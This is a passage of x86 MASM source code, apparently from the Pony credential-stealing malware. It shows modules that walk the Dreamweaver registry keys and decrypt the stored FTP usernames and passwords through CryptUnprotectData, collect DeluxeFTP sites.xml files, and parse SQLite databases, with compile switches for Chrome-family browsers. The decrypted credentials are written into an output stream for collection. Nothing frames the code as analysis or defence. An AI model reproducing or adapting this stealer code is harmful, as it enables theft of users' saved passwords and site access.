		sub	eax, eax
		ret
	.ENDIF
	
	shr	eax, 1
	mov	edx, lpdwPasswordLen
	mov	dword ptr[edx], eax
	mov	ebx, eax
	.IF	!CARRY?
		mov	esi, lpPass
		mov	edi, lpPass
		
		; decode hex string
		.WHILE	ebx
			mov	ax, word ptr[esi]
			.IF	ah >= '0' && ah <= '9'
				sub	ah, '0'
			.ELSEIF	ah >= 'A' && ah <= 'F'
				sub	ah, 'A'
				add	ah, 0ah
			.ELSE
				sub	eax, eax
				ret
			.ENDIF
			.IF	al >= '0' && al <= '9'
				sub	al, '0'
			.ELSEIF	al >= 'A' && al <= 'F'
				sub	al, 'A'
				add	al, 0ah
			.ELSE
				sub	eax, eax
				ret
			.ENDIF
			shl	al, 4
			or	al, ah
			stosb
			dec	ebx
			add	esi, 2
		.ENDW
		
		mov	eax, lpdwPasswordLen
		m2m	InBlob.cbData, dword ptr [eax] 
		m2m	InBlob.pbData, lpPass
		mov	OutBlob.pbData, 0
		
		.IF	MyCryptUnprotectData
			lea	eax, OutBlob
			push	eax
			push	CRYPTPROTECT_UI_FORBIDDEN
			push	0
			push	0
			push	0
			push	0
			lea	eax, InBlob
			push	eax
			call	MyCryptUnprotectData
			.IF	eax && OutBlob.pbData
				mov	eax, lpdwPasswordLen
				mov	ecx, OutBlob.cbData
				
				; check if the input buffer is large enough to hold the decrypted password
				.IF	ecx <= dword ptr[eax]
					cld
					mov	esi, OutBlob.pbData
					mov	edi, lpPass
					mov	ecx, OutBlob.cbData
					jecxz	@F
					rep movsb
				@@:				
					mov	eax, lpdwPasswordLen
					m2m	dword ptr[eax], OutBlob.cbData
					invoke	LocalFree, OutBlob.pbData
					
					mov	eax, TRUE
					ret
				.ENDIF
			.ENDIF
		.ENDIF			
	.ENDIF
	
	sub	eax, eax
	ret
DreamweaverDecryptPass endp

DreamweaverReadSite proc stream, BasePath, nSite
	LOCAL	szHost: DWORD
	LOCAL	szURL: DWORD
	LOCAL	szDir: DWORD
	LOCAL	szUser: DWORD
	LOCAL	szPass: DWORD
	LOCAL	szNamePassPath: DWORD
	LOCAL	szSFTP: DWORD
	LOCAL	lpHost: DWORD
	LOCAL	lpURL: DWORD
	LOCAL	lpDir: DWORD
	LOCAL	lpUser: DWORD
	LOCAL	lpPass: DWORD
	LOCAL	lpSFTP: DWORD
	LOCAL	dwPasswordLen: DWORD
	LOCAL	dwUserLen: DWORD
	LOCAl	dwSFTPLen: DWORD
	
	invoke	MemAlloc, 8192
	mov	szHost, eax
	invoke	MemAlloc, 8192
	mov	szURL, eax
	invoke	MemAlloc, 8192
	mov	szDir, eax
	invoke	MemAlloc, 8192
	mov	szUser, eax
	invoke	MemAlloc, 8192
	mov	szPass, eax
	invoke	MemAlloc, 8192
	mov	szNamePassPath, eax
	invoke	MemAlloc, 8192
	mov	szSFTP, eax
	
	invoke	wsprintf, szHost, addr CDreamweaverHostFmt, nSite
	invoke	wsprintf, szURL, addr CDreamweaverUrlFmt, nSite
	invoke	wsprintf, szDir, addr CDreamweaverDirFmt, nSite
	invoke	wsprintf, szUser, addr CDreamweaverUserFmt, nSite
	invoke	wsprintf, szPass, addr CDreamweaverPassFmt, nSite
	invoke	wsprintf, szNamePassPath, addr CDreamweaverNameFmt, BasePath
	invoke	wsprintf, szSFTP, addr CDreamweaverSFTPFmt, nSite
	
	invoke	RegReadValueStr, dwCurrentUserKey, BasePath, szHost, NULL
	mov	lpHost, eax
	invoke	RegReadValueStr, dwCurrentUserKey, BasePath, szURL, NULL
	mov	lpURL, eax
	invoke	RegReadValueStr, dwCurrentUserKey, BasePath, szDir, NULL
	mov	lpDir, eax
	invoke	RegReadValueStr, dwCurrentUserKey, szNamePassPath, szUser, NULL
	mov	lpUser, eax
	invoke	RegReadValueStr, dwCurrentUserKey, szNamePassPath, szPass, NULL
	mov	lpPass, eax
	invoke	RegReadValueStr, dwCurrentUserKey, BasePath, szSFTP, addr dwSFTPLen
	mov	lpSFTP, eax
	
	.IF	lpHost && lpUser && lpPass
		invoke	DreamweaverDecryptPass, lpUser, addr dwUserLen
		.IF	eax && dwUserLen
			invoke	DreamweaverDecryptPass, lpPass, addr dwPasswordLen
			.IF	eax && dwPasswordLen
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 10h
				invoke	StreamWriteString, stream, lpHost
				invoke	StreamWriteString, stream, lpURL
				invoke	StreamWriteString, stream, lpDir			
				invoke	StreamWriteBinaryString, stream, lpUser, dwUserLen
				invoke	StreamWriteBinaryString, stream, lpPass, dwPasswordLen

				.IF	lpSFTP && dwSFTPLen == 4
					mov	eax, lpSFTP
					invoke	StreamWriteDWORD, stream, dword ptr[eax]
				.ELSE
					invoke	StreamWriteDWORD, stream, 0
				.ENDIF
			.ENDIF
		.ENDIF
	.ENDIF
	
	invoke	MemFree, szHost
	invoke	MemFree, szURL
	invoke	MemFree, szDir
	invoke	MemFree, szUser
	invoke	MemFree, szPass
	invoke	MemFree, szNamePassPath
	invoke	MemFree, szSFTP
	invoke	MemFree, lpHost
	invoke	MemFree, lpURL
	invoke	MemFree, lpDir
	invoke	MemFree, lpUser
	invoke	MemFree, lpPass
	invoke	MemFree, lpSFTP
	
	ret
DreamweaverReadSite endp

DreamweaverScanReg proc stream, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	dwDataLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	nServers: DWORD
	LOCAL	S: DWORD
	
	invoke	RegOpenKey, dwCurrentUserKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CDreamweaverSiteServers, addr dwDataLen
			mov	nServers, eax
			.IF	nServers
				.IF	dwDataLen == 4
					mov	eax, nServers
					m2m	nServers, dword ptr[eax]
					.IF	nServers > 1000
						mov	nServers, 1000
					.ENDIF
					.WHILE	nServers
						dec	nServers
						invoke	DreamweaverReadSite, stream, S, nServers
					.ENDW
				.ENDIF
				invoke	MemFree, nServers
			.ENDIF
			
			invoke	MemFree, nServers
			
			; recursively scan subfolders
			invoke	DreamweaverScanReg, stream, S			
			invoke	MemFree, S
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
DreamweaverScanReg endp

GrabDreamweaver proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_DREAMWEAVER, 0
	mov	hdr_ofs, eax
	
    	invoke	DreamweaverScanReg, stream, offset CDreamweaverBasePath
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabDreamweaver endp

ENDIF

IFDEF COMPILE_MODULE_DELUXEFTP

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; DeluxeFTP 6
; http://www.deluxeftp.com/
; Tested: Version 6.0.1
; SFTP: not supported

.data
	CDeluxeFTPName		db	'DeluxeFTP',0
	CDeluxeFTPXMLFile	db	'sites.xml',0

.code

GrabDeluxeFTP proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_DELUXEFTP, 0
	mov	hdr_ofs, eax
	
	mov	esi, lpInstalledList
	mov	edi, lpInstalledNames
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CDeluxeFTPName
		.IF	eax
			invoke	ExtractFilePath, esi
			push	eax
			invoke	CommonFileScan, stream, eax, offset CDeluxeFTPXMLFile, ITEMHDR_ID or 0
			call	MemFree
		.ENDIF
		.WHILE	byte ptr[esi]
			inc	esi
		.ENDW
		inc	esi
		@Next	@n
	.ENDIF
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabDeluxeFTP endp

ENDIF

IFDEF COMPILE_MODULE_CHROME
	COMPILE_CHROMIUM_CODE	equ	1
ELSEIFDEF COMPILE_MODULE_CHROMIUM
	COMPILE_CHROMIUM_CODE	equ	1
ELSEIFDEF COMPILE_MODULE_CHROMEPLUS
	COMPILE_CHROMIUM_CODE	equ	1	
ELSEIFDEF COMPILE_MODULE_BROMIUM
	COMPILE_CHROMIUM_CODE	equ	1	
ELSEIFDEF COMPILE_MODULE_NICHROME
	COMPILE_CHROMIUM_CODE	equ	1	
ELSEIFDEF COMPILE_MODULE_COMODODRAGON
	COMPILE_CHROMIUM_CODE	equ	1
ELSEIFDEF COMPILE_MODULE_ROCKMELT
	COMPILE_CHROMIUM_CODE	equ	1
ELSEIFDEF COMPILE_MODULE_COOLNOVO
	COMPILE_CHROMIUM_CODE	equ	1
ELSEIFDEF COMPILE_MODULE_YANDEXINTERNET
	COMPILE_CHROMIUM_CODE	equ	1
ELSEIFDEF COMPILE_MODULE_OPERA
	COMPILE_CHROMIUM_CODE	equ	1
ENDIF

IFDEF COMPILE_CHROMIUM_CODE
	COMPILE_SQLITE3_CODE	equ	1
ELSEIFDEF COMPILE_MOZILLA_CODE
	COMPILE_SQLITE3_CODE	equ	1
ENDIF

IFDEF COMPILE_SQLITE3_CODE

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Tiny SQLite3 database engine implementation

.data
	szSQLite3Header		db	'SQLite format 3',0
	szSQLite3TableType	db	'table',0
	
	szSQLiteLeftBracket	db	'(',0
	szSQLiteRightBracket	db	')',0
	szSQLiteSpaceChar	db	' ',0
	szSQLiteStopWords	db	'CONSTRAINT',0,'PRIMARY',0,'UNIQUE',0,'CHECK',0,'FOREIGN',0,0
	
.data?
	dwSQLitePageSize	dd	?
	dwSQLiteEncoding	dd	?

.code

SQLITE_DATATYPE_INT 	equ 0
SQLITE_DATATYPE_STR 	equ 1
SQLITE_DATATYPE_BLOB 	equ 2
SQLITE_DATATYPE_OTHER 	equ 3

SQLITE_PAGE_LEAF 		equ 13
SQLITE_PAGE_INTERIOR	equ 5

; 64-bit SHL emulation
shl64 MACRO arg, ct
	mov eax, dword ptr arg
	mov edx, dword ptr &arg&+4
	shld edx, eax, ct
	shl eax, ct
	mov dword ptr arg, eax
	mov dword ptr &arg&+4, edx
ENDM

; Read Huffman encoding 64-bit twos-complement integer (VARINT) from the data stream
SQLiteReadVarInt proc uses ebx stream, lpStatusCode, plen
	LOCAL	result: QWORD
	
	mov	dword ptr[result], 0
	mov	dword ptr[result+4], 0
	
	mov	eax, lpStatusCode
	.IF	!dword ptr[eax]
		sub	eax, eax
		sub	edx, edx
		ret
	.ENDIF
	
	mov	ebx, 1
	.WHILE	ebx <= 9
		.IF	plen
			mov	eax, plen
			mov	dword ptr[eax], ebx
		.ENDIF
		invoke	Stream_SafeReadByte, stream, lpStatusCode
		.IF	ebx == 9
			or	dword ptr[result], eax
			jmp	@return_result
		.ENDIF
		
		push	eax
		and	eax, not 80h
		or	dword ptr[result], eax
		pop	eax
		
		test	eax, 80h
		.IF	ZERO?
			jmp	@return_result
		.ENDIF
		
		.IF	ebx == 8
			shl64	result, 8
		.ELSE
			shl64	result, 7
		.ENDIF
		
		inc	ebx
	.ENDW
	
@return_result:
	mov	eax, lpStatusCode
	.IF	!dword ptr[eax]
		sub	eax, eax
		sub	edx, edx
	.ELSE
		mov	eax, dword ptr[result]
		mov	edx, dword ptr[result+4]
	.ENDIF	
	ret
SQLiteReadVarInt endp

; Build full data stream out of page chunks
SQLiteBuildPayloadStream proc stream, bytes_stored, payload_len, lpStatusCode
	LOCAL	payload_data_stream: DWORD
	LOCAL	mem: DWORD
	LOCAL	next_overflow_page: DWORD

	mov	eax, dwSQLitePageSize	
	.IF	bytes_stored > eax
		sub	eax, eax
		ret
	.ENDIF
	
	invoke	MemAlloc, dwSQLitePageSize
	mov	mem, eax
	
	invoke	StreamCreate, addr payload_data_stream
	invoke	Stream_SafeReadStream, stream, mem, bytes_stored, lpStatusCode
	.IF	eax
		invoke	StreamWrite, payload_data_stream, mem, bytes_stored
		mov	eax, bytes_stored
		.IF	eax < payload_len
			invoke	Stream_SafeReadDWORD, stream, lpStatusCode
			mov	next_overflow_page, eax
			
			.WHILE	(next_overflow_page != 0)
				dec	next_overflow_page
				sub	edx, edx
				mov	eax, next_overflow_page
				mul	dwSQLitePageSize
				.IF	edx
					jmp	@stream_err
				.ENDIF
				invoke	StreamSeekOffset, stream, eax, OFS_BEGIN
				invoke	Stream_SafeReadDWORD, stream, lpStatusCode
				mov	edx, lpStatusCode
				.IF	!dword ptr[edx]
					jmp	@stream_err
				.ENDIF				
				mov	next_overflow_page, eax
				
				mov	ecx, dwSQLitePageSize
				sub	ecx, 4
				push	ecx
				invoke	Stream_SafeReadStream, stream, mem, ecx, lpStatusCode
				pop	ecx
				.IF	!eax
					jmp	@stream_err
				.ENDIF
				invoke	StreamWrite, payload_data_stream, mem, ecx
				invoke	StreamGetLength, payload_data_stream
				.IF	eax > 1024*1024*100
					jmp	@stream_err
				.ENDIF
			.ENDW
		.ENDIF
	.ELSE
	@stream_err:
		invoke	StreamFree, payload_data_stream
		mov	payload_data_stream, NULL 
		
		mov	eax, lpStatusCode
		mov	dword ptr[eax], FALSE
	.ENDIF
	
	invoke	MemFree, mem
	
	mov	eax, payload_data_stream
	ret
SQLiteBuildPayloadStream endp

; Allocate memory and store record data
SQLiteBuildDataRecord proc uses edi lpData, dwDataLen, dwDataType, lpDataOut
	mov	eax, dwDataLen
	add	eax, 8
	invoke	MemAlloc, eax
	mov	edi, eax
	
	m2m	dword ptr[edi], dwDataLen
	m2m	dword ptr[edi+4], dwDataType
	
	.IF	dwDataLen
		invoke	MoveMem, lpData, addr [edi+8], dwDataLen
	.ENDIF
	
	mov	eax, lpDataOut
	mov	dword ptr[eax], edi
	
	mov	eax, TRUE
	ret
SQLiteBuildDataRecord endp

SQLiteReadRecord proc stream, serial, lpStatusCode, lpDataOut
	LOCAL	IntVal: DWORD
	LOCAL	StrVal: DWORD
	LOCAL	StrLen: DWORD
	
	mov	edx, lpDataOut
	mov	dword ptr[edx], NULL
	
	; Parity check required for blobs and strings
	sub	edx, edx
	test	serial, 1
	setz	dl
	
	.IF	serial == 0
		; NULL
		invoke	SQLiteBuildDataRecord, NULL, 0, SQLITE_DATATYPE_OTHER, lpDataOut
	.ELSEIF	serial == 1
		; 8-bit int
		invoke	Stream_SafeReadByte, stream, lpStatusCode
		mov	IntVal, eax
		invoke	SQLiteBuildDataRecord, addr IntVal, 4, SQLITE_DATATYPE_INT, lpDataOut
	.ELSEIF	serial == 2
		; 16-bit int
		invoke	Stream_SafeReadWORD, stream, lpStatusCode
		mov	IntVal, eax
		invoke	SQLiteBuildDataRecord, addr IntVal, 4, SQLITE_DATATYPE_INT, lpDataOut
	.ELSEIF	serial == 3
		; 24-bit int
		invoke	Stream_SafeReadSkip, stream, 3, lpStatusCode
		invoke	SQLiteBuildDataRecord, NULL, 0, SQLITE_DATATYPE_OTHER, lpDataOut
	.ELSEIF	serial == 4
		; 32-bit int
		invoke	Stream_SafeReadDWORD, stream, lpStatusCode
		mov	IntVal, eax
		invoke	SQLiteBuildDataRecord, addr IntVal, 4, SQLITE_DATATYPE_INT, lpDataOut
	.ELSEIF	serial == 5
		; 48-bit int
		invoke	Stream_SafeReadSkip, stream, 6, lpStatusCode
		invoke	SQLiteBuildDataRecord, NULL, 0, SQLITE_DATATYPE_OTHER, lpDataOut
	.ELSEIF	serial == 6
		; 64-bit int
		invoke	Stream_SafeReadSkip, stream, 8, lpStatusCode
		invoke	SQLiteBuildDataRecord, NULL, 0, SQLITE_DATATYPE_OTHER, lpDataOut
	.ELSEIF	serial == 7
		; float 
		invoke	Stream_SafeReadSkip, stream, 8, lpStatusCode
		invoke	SQLiteBuildDataRecord, NULL, 0, SQLITE_DATATYPE_OTHER, lpDataOut
	.ELSEIF	serial == 8
		; 0
		mov	IntVal, 0
		invoke	SQLiteBuildDataRecord, addr IntVal, 4, SQLITE_DATATYPE_INT, lpDataOut		
	.ELSEIF	serial == 9
		; 1
		mov	IntVal, 1
		invoke	SQLiteBuildDataRecord, addr IntVal, 4, SQLITE_DATATYPE_INT, lpDataOut
	.ELSEIF	serial == 10
		; Reserved
		mov	eax, FALSE
	.ELSEIF	serial == 11
		; Reserved
		mov	eax, FALSE
	.ELSEIF (serial >= 12) && (edx) && (serial < 1024*1024*100)
		; BLOB
		m2m	StrLen, serial
		sub	StrLen, 12
		shr	StrLen, 1
		invoke	MemAlloc, StrLen
		mov	StrVal, eax
		invoke	Stream_SafeReadStream, stream, StrVal, StrLen, lpStatusCode
		invoke	SQLiteBuildDataRecord, StrVal, StrLen, SQLITE_DATATYPE_BLOB, lpDataOut
		invoke	MemFree, StrVal
		mov	eax, TRUE
	.ELSEIF (serial >= 13) && (!edx) && (serial < 1024*1024*100)
		; String (UTF-8)
		m2m	StrLen, serial
		sub	StrLen, 13
		shr	StrLen, 1
		invoke	MemAlloc, StrLen
		mov	StrVal, eax
		invoke	Stream_SafeReadStream, stream, StrVal, StrLen, lpStatusCode
		invoke	SQLiteBuildDataRecord, StrVal, StrLen, SQLITE_DATATYPE_STR, lpDataOut
		invoke	MemFree, StrVal
		mov	eax, TRUE
	.ELSE
		mov	eax, FALSE
	.ENDIF
	ret
SQLiteReadRecord endp

SQLiteFreeRecordArray proc uses esi record_array
	.IF	!record_array
		ret
	.ENDIF
	
	mov	esi, record_array
	.WHILE	dword ptr[esi]
		invoke	MemFree, dword ptr[esi]
		add	esi, 4
	.ENDW
	
	invoke	MemFree, record_array
	ret
SQLiteFreeRecordArray endp

; Get data length & pointer for a single cell from 1-dim record array
SQLiteGetRecordArrayCell proc record_array, nCell, cell_len, cell_type, cell_data
	mov	eax, record_array
	mov	edx, nCell
	mov	eax, dword ptr[eax+edx*4]
	
	.IF	cell_len
		mov	edx, cell_len
		m2m	dword ptr[edx], dword ptr[eax]
	.ENDIF
	
	.IF	cell_type
		mov	edx, cell_type
		m2m	dword ptr[edx], dword ptr[eax+4]
	.ENDIF

	.IF	cell_data
		mov	edx, cell_data
		m2m	dword ptr[edx], eax
		add	dword ptr[edx], 8
	.ENDIF

	ret
SQLiteGetRecordArrayCell endp

; Process encoded payload data (row)
SQLiteProcessPayloadStream proc uses edi esi stream, result_array, result_count
	LOCAL	records_mem: DWORD
	LOCAL	stream_len: DWORD
	LOCAL	dwStatusCode: DWORD
	LOCAL	varint_len: DWORD
	LOCAL	header_self_len: DWORD
	LOCAL	header_len: DWORD
	LOCAL	nRecords: DWORD
	LOCAL	RecordData: DWORD
	LOCAL	result: DWORD
	
	mov	eax, result_count
	mov	dword ptr[eax], 0
	mov	eax, result_array
	mov	dword ptr[eax], NULL
	
	.IF	!stream
		sub	eax, eax
		ret
	.ENDIF
	
	invoke	StreamGetLength, stream
	.IF	!eax
		sub	eax, eax
		ret
	.ENDIF
	mov	stream_len, eax
	invoke	StreamGotoBegin, stream
	
	; Get header length
	mov	dwStatusCode, TRUE
	invoke	SQLiteReadVarInt, stream, addr dwStatusCode, addr header_self_len
	.IF	(header_self_len > eax) || (!dwStatusCode) || (edx)
		sub	eax, eax
		ret
	.ENDIF
	
	; Calculate real header length
	sub	eax, header_self_len
	mov	header_len, eax

	; Do not process headers longer than 10MB
	.IF	header_len > 1024*1024*10
		sub	eax, eax
		ret
	.ENDIF

	mov	eax, header_len
	shl	eax, 2
 	invoke	MemAlloc, eax
 	
	mov	records_mem, eax
	mov	edi, eax

	; Read header (record types)
	mov	nRecords, 0
	.WHILE	(header_len > 0) && (dwStatusCode)
		invoke	SQLiteReadVarInt, stream, addr dwStatusCode, addr varint_len
		mov	ecx, varint_len
		.IF	(ecx > header_len) || (edx)
			invoke	MemFree, records_mem
			sub	eax, eax
			ret
		.ENDIF
		sub	header_len, ecx
		inc	nRecords
		stosd
	.ENDW
	
	.IF	(header_len != 0) || (!dwStatusCode)
		invoke	MemFree, records_mem
		sub	eax, eax
		ret
	.ENDIF
	
	.IF	!nRecords
		jmp	@result_ok
	.ENDIF
	
	; Read records (cells)
	
	; Prepare result array
	mov	eax, result_count
	m2m	dword ptr[eax], nRecords
	
	mov	eax, nRecords
	shl	eax, 2
	invoke	MemAlloc, eax
	mov	result, eax
	mov	edi, result
	mov	esi, records_mem
	.WHILE	nRecords && dwStatusCode
		lodsd
		mov	edx, eax
		
		mov	RecordData, 0
		invoke	SQLiteReadRecord, stream, edx, addr dwStatusCode, addr RecordData
		.IF	(!eax) || (!dwStatusCode) || (!RecordData) 
			.IF	RecordData
				invoke	MemFree, RecordData
			.ENDIF
			invoke	SQLiteFreeRecordArray, result
			invoke	MemFree, records_mem
			sub	eax, eax
			ret
		.ENDIF
		
		; Store record cell into result_array
		mov	eax, RecordData
		stosd
		dec	nRecords
	.ENDW
	
	mov	eax, result_array
	m2m	dword ptr[eax], result
	
@result_ok:
	invoke	MemFree, records_mem
	mov	eax, TRUE
	ret
SQLiteProcessPayloadStream endp

; Process database page
SQLiteReadPage proc uses edi stream, target_stream, nPage, lpStatusCode, item_id, lpCallbackFunc
	LOCAL	page_type: DWORD
	LOCAL	nCells: DWORD
	LOCAL	cell_offset_array: DWORD
	LOCAL	page_offset: DWORD
	LOCAL	payload_len: DWORD
	LOCAL	_U: DWORD
	LOCAL	S: DWORD
	LOCAL	M: DWORD
	LOCAL	payload_stream: DWORD
	LOCAL	result_array: DWORD
	LOCAL	result_count: DWORD
	LOCAL	result_status: DWORD
	LOCAL	left_child: DWORD
	LOCAL	r_pointer: DWORD

	.IF	nPage == 0
		mov	eax, TRUE
		ret
	.ENDIF
	
	dec	nPage
	
	sub	edx, edx
	mov	eax, nPage
	mul	dwSQLitePageSize
	mov	page_offset, eax
	invoke	StreamSeekOffset, stream, page_offset, OFS_BEGIN
	.IF	nPage == 0
		invoke	StreamSeekOffset, stream, 100, OFS_CUR
	.ENDIF
	
	invoke	Stream_SafeReadByte, stream, lpStatusCode
	mov	page_type, eax
	invoke	Stream_SafeReadWORD, stream, lpStatusCode
	invoke	Stream_SafeReadWORD, stream, lpStatusCode
	mov	nCells, eax
	invoke	Stream_SafeReadWORD, stream, lpStatusCode
	invoke	Stream_SafeReadByte, stream, lpStatusCode
	
	mov	eax, lpStatusCode
	.IF	(!dword ptr[eax]) || ((page_type != SQLITE_PAGE_LEAF) && (page_type != SQLITE_PAGE_INTERIOR))
		sub	eax, eax
		ret
	.ENDIF 
	
	mov	eax, dwSQLitePageSize
	shr	eax, 1
	.IF	nCells > eax
		sub	eax, eax
		ret
	.ENDIF
	
	; The right-most pointer
	.IF	page_type == SQLITE_PAGE_INTERIOR
		invoke	Stream_SafeReadDWORD, stream, lpStatusCode
		mov	r_pointer, eax
	.ENDIF
	
	invoke	MemAlloc, 32768*2
	mov	cell_offset_array, eax
	
	; Read cell offset array	
	sub	edi, edi
	.WHILE	edi < nCells
		invoke	Stream_SafeReadWORD, stream, lpStatusCode
		mov	edx, cell_offset_array
		mov	dword ptr[edx+edi*4], eax
		inc	edi
	.ENDW
	
	mov	eax, lpStatusCode
	.IF	!dword ptr[eax]
		invoke	MemFree, cell_offset_array
		sub	eax, eax
		ret
	.ENDIF
	
	.IF	page_type == SQLITE_PAGE_INTERIOR
		; B-tree interior page, contains pointers to other pages
		sub	edi, edi
		.WHILE	edi < nCells
			mov	edx, cell_offset_array
			mov	eax, dword ptr[edx+edi*4]
			add	eax, page_offset
			invoke	StreamSeekOffset, stream, eax, OFS_BEGIN
			
			; Left child
			invoke	Stream_SafeReadDWORD, stream, lpStatusCode
			mov	left_child, eax
			
			; Row-ID
			invoke	SQLiteReadVarInt, stream, lpStatusCode, NULL
			mov	ecx, lpStatusCode
			.IF	!dword ptr[ecx]
				invoke	MemFree, cell_offset_array
				sub	eax, eax
				ret
			.ENDIF
			
			invoke	SQLiteReadPage, stream, target_stream, left_child, lpStatusCode, item_id, lpCallbackFunc
			.IF	!eax
				invoke	MemFree, cell_offset_array
				sub	eax, eax
				ret
			.ENDIF
			
			inc	edi
		.ENDW
		
		invoke	SQLiteReadPage, stream, target_stream, r_pointer, lpStatusCode, item_id, lpCallbackFunc
		.IF	!eax
			invoke	MemFree, cell_offset_array
			sub	eax, eax
			ret
		.ENDIF
	.ELSEIF	page_type == SQLITE_PAGE_LEAF
		; B-tree leaf page, contains payload data (row)
		sub	edi, edi
		.WHILE	edi < nCells
			mov	edx, cell_offset_array
			mov	eax, dword ptr[edx+edi*4]
			add	eax, page_offset
			invoke	StreamSeekOffset, stream, eax, OFS_BEGIN
			
			; Payload length
			invoke	SQLiteReadVarInt, stream, lpStatusCode, NULL
			mov	ecx, lpStatusCode
			.IF	!dword ptr[ecx]
				invoke	MemFree, cell_offset_array
				sub	eax, eax
				ret
			.ENDIF
			
			.IF	edx
				; Do not process records with payload length greater than 4GB (INT64)
				.BREAK
			.ENDIF
			
			mov	payload_len, eax
			
			; Row-ID
			invoke	SQLiteReadVarInt, stream, lpStatusCode, NULL
			mov	ecx, lpStatusCode
			.IF	!dword ptr[ecx]
				invoke	MemFree, cell_offset_array
				sub	eax, eax
				ret
			.ENDIF
			
			; Determine payload storage
			m2m	_U, dwSQLitePageSize ; usable page size
			mov	eax, _U		; U = page_size
			sub	eax, 12		; U = U - 12
			shl	eax, 5		; U = U * 32
			sub	edx, edx
			mov	ecx, 255	; U = U div 255
			div	ecx
			sub	eax, 23		; U = U - 23
			mov	M, eax
			
			sub	_U, 35
			mov	eax, payload_len
			.IF	eax <= _U
				; payload_len is less than or equal to U-35
				; entire payload is stored on the b-tree leaf page
			.ELSE
				; Payload is spilled onto overflow pages 
				sub	edx, edx
				mov	eax, payload_len
				sub	eax, M		; payload_len - M
				mov	ecx, _U
				add	ecx, 35		
				sub	ecx, 4		; U - 4
				div	ecx			; div (U - 4)
				add	edx, M		; division reminder + M
				mov	S, edx
			
				mov	eax, _U
				.IF	eax < S
					mov	eax, M
				.ELSE
					mov	eax, S
				.ENDIF
			.ENDIF
			
			invoke	SQLiteBuildPayloadStream, stream, eax, payload_len, lpStatusCode
			.IF	!eax
				invoke	MemFree, cell_offset_array
				sub	eax, eax
				ret
			.ENDIF
			
			mov	payload_stream, eax
			mov	edx, eax
			invoke	SQLiteProcessPayloadStream, edx, addr result_array, addr result_count
			mov	result_status, eax
			invoke	StreamFree, payload_stream
			
			.IF	result_status && result_array
				push	item_id
				push	result_count
				push	result_array
				push	target_stream
				push	stream
				call	lpCallbackFunc
				invoke	SQLiteFreeRecordArray, result_array
			.ENDIF
			
			inc	edi
		.ENDW
	.ENDIF
	
	invoke	MemFree, cell_offset_array
	mov	eax, TRUE

	ret
SQLiteReadPage endp

; Extract column names and indexes from the table SQL schema
SQLiteProcessSQL proc uses esi edi sql, callback_func
	LOCAL	state: DWORD
	LOCAL	k: DWORD
	LOCAL	nCol: DWORD
	
	invoke	StrStrI, sql, offset szSQLiteLeftBracket
	.IF	!eax
		ret
	.ENDIF

	cld
	
	; Cut everything before '(' char
	inc	eax
	mov	esi, eax
	mov	edi, sql
	.WHILE	byte ptr[esi]
		movsb
	.ENDW
	movsb
	
	invoke	StrStrI, sql, offset szSQLiteRightBracket
	.IF	!eax
		ret
	.ENDIF

	; Replace unused chars
	mov	edi, sql
	.WHILE	byte ptr[edi]
		.IF	byte ptr[edi] == 9 || byte ptr[edi] == 13 || byte ptr[edi] == 10 || byte ptr[edi] == '[' || byte ptr[edi] == ']' || byte ptr[edi] == '`'
			mov	byte ptr[edi], ' '
		.ENDIF
		inc	edi
	.ENDW
	
	; Cut quoted ('abc') sequences
	mov	state, 0
	mov	k, 0
	mov	edi, sql
	.WHILE	byte ptr[edi]
		.IF	byte ptr[edi] == "'"
			.IF	state == 0
				test	k, 1
				.IF	ZERO?
					mov	state, 1
				.ENDIF
			.ELSE
				test	k, 1
				.IF	ZERO?
					mov	byte ptr[edi], ' '
					mov	state, 0
				.ENDIF
			.ENDIF
		.ENDIF
		
		.IF	byte ptr[edi] == "\"
			inc	k
		.ELSE
			mov	k, 0
		.ENDIF
		
		.IF	state == 1
			mov	byte ptr[edi], ' '
		.ENDIF
		inc	edi
	.ENDW

	; Replace double space chars to single space chars ('  ' -> ' ')
	mov	edi, sql
	.WHILE	byte ptr[edi]
		.IF	(byte ptr[edi] == ' ') && (byte ptr[edi+1] == ' ')
			push	edi
			.WHILE	byte ptr[edi]
				mov	al, byte ptr[edi+1]
				mov	byte ptr[edi], al
				inc	edi
			.ENDW
			pop	edi
			dec	edi
		.ENDIF
		inc	edi
	.ENDW
	
	; Process column definitions one by one
	mov	nCol, 0
	mov	esi, sql
	mov	edi, sql
	.WHILE	byte ptr[edi]
		.IF	byte ptr[edi] == ','
			mov	byte ptr[edi], 0
			push	nCol
			push	esi
			call	callback_func
			.IF	!eax
				ret
			.ENDIF
			mov	esi, edi
			inc	esi
			inc	nCol
		.ENDIF
		inc	edi
	.ENDW
	push	nCol
	push	esi
	call	callback_func
	
	ret
SQLiteProcessSQL endp

ProcessSQLiteStream proc stream, target_stream, item_id, callback_func
	LOCAL	header[16]: BYTE
	LOCAL	dwStatusCode: DWORD
	
	; Read database header
	
